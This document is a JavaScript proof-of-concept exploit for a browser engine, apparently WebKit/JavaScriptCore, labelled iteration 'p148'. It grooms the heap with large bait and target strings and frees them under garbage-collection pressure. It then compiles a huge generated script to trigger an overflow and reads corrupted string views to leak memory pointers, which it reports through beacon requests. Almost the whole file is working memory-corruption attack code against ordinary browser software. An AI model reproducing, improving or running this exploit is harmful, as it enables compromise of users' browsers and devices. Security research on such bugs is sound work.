// p148 — Main-thread targets + substring views
// FIX: Worker's StringImpl was in a different marge page (not in sweep path).
//      Now targets are allocated on MAIN THREAD, same marge pages as baits.
//      Substring views created before overflow — views in small-obj heap (safe).
//      After compile, main thread reads views directly (sweep is done by onload).
//
// Worker ONLY used for .length polling (detects JSString corruption from MarkedSpace
// overlap, gives us timing info). Main thread reads the actual pointer leak.
//
// Beacon prefix: V148M-

(function() {
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V148M-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var STR_LEN = 100000;
  var CANARY = 0x41;

  // PHASE 1: BAIT STRINGS (main thread, Primary marge)
  var N_BAIT = 20;
  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // PHASE 2: TARGET STRINGS (main thread, SAME marge pages as baits)
  var N_TARGET = 14;
  var targets = [];
  var views = [];
  for (var i = 0; i < N_TARGET; i++) {
    var s = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
    }
    s = s.substring(0, STR_LEN);
    s.charCodeAt(0);
    targets.push(s);
    // Substring view: header in small-obj heap (safe), m_data8 → original inline data
    views.push(s.substring(0, 90000));
  }
  B('TARGETS-' + N_TARGET);

  // PHASE 3: FREE BAITS + GC PRESSURE
  B('FREE-START');
  for (var i = 0; i < baits.length; i++) baits[i] = null;
  baits = null;

  var gcRound = 0;
  function gcPressureRound() {
    for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
    for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
    gcRound++;
    if (gcRound < 30) setTimeout(gcPressureRound, 30);
    else { B('GC-' + gcRound); phaseBuildOverflow(); }
  }
  gcPressureRound();

  // PHASE 4: BUILD + COMPILE OVERFLOW
  function phaseBuildOverflow() {
    B('BUILD');
    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v148fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v148ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v148ok ? 'OK' : 'FAIL'));
      if (!window.__v148fn) { B('NO-FN'); return; }

      // Sweep is DONE by the time onload fires.
      // Read targets and views NOW from the main thread.
      phaseReadLeak();
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // PHASE 5: READ CORRUPTION + POINTER LEAK
  function phaseReadLeak() {
    var corrupted = 0;
    var leaked = 0;

    for (var i = 0; i < targets.length; i++) {
      // Check StringImpl m_length via the targets array
      // NOTE: this reads JSString::m_length (may or may not reflect StringImpl corruption)
      var len = targets[i].length;

      // Also check the VIEW's first char — if not 'A', StringImpl data is corrupted
      var v0;
      try { v0 = views[i].charCodeAt(0); } catch(e) { v0 = -1; }

      if (len !== STR_LEN) {
        B('H-' + i + '-len=' + len);
        corrupted++;
      }

      if (v0 !== CANARY && v0 !== -1) {
        B('DATA-' + i + '-v0=' + v0);
        corrupted++;

        // StringImpl data IS corrupted — read the pointer leak!
        try {
          var ptr = '';
          for (var p = 0; p < 8; p++) ptr += hexByte(views[i].charCodeAt(p));
          B('PTR-' + i + '-' + ptr);

          // Full entry dump: first 80 bytes (entry bytes 24-103)
          var hex1 = '';
          for (var b = 0; b < 80; b++) hex1 += hexByte(views[i].charCodeAt(b));
          B('E1-' + i + '-' + hex1.substring(0, 160));
          if (hex1.length > 160) B('E2-' + i + '-' + hex1.substring(160));

          // m_bytecodeIndex (entry bytes 68-71 = charCodeAt(44..47))
          var idx = '';
          for (var d = 44; d < 48; d++) idx += hexByte(views[i].charCodeAt(d));
          B('IDX-' + i + '-' + idx);

          leaked++;
        } catch(ex) {
          B('READ-ERR-' + i + '-' + (ex.message || '').substring(0, 30));
        }
      } else if (v0 === CANARY && len !== STR_LEN) {
        // JSString header corrupted but StringImpl data intact
        // (StringImpl not in sweep path — same as p147)
        B('JSCORRUPT-' + i);
      }
    }

    B('CORRUPT-' + corrupted + '-LEAKED-' + leaked);

    if (leaked === 0) {
      // Fallback: try direct charCodeAt on targets (risky — m_data8 may be bad)
      B('FALLBACK-DIRECT');
      for (var i = 0; i < targets.length; i++) {
        try {
          var c0 = targets[i].charCodeAt(0);
          if (c0 !== CANARY) {
            B('DIRECT-' + i + '-c0=' + c0);
            var ptr = '';
            for (var p = 0; p < 8; p++) ptr += hexByte(targets[i].charCodeAt(p));
            B('DPTR-' + i + '-' + ptr);
            leaked++;
            break;
          }
        } catch(e) {
          B('DCATCH-' + i);
          break;
        }
      }
    }

    B('FINAL-LEAKED-' + leaked);

    // Call the function to complete the test
    setTimeout(function() {
      B('CALLING');
      try { window.__v148fn(function(){}); }
      catch(ex) { B('CATCH-' + (ex.message || '').substring(0, 30)); }
      B('SURVIVED');
    }, 100);
  }
})();
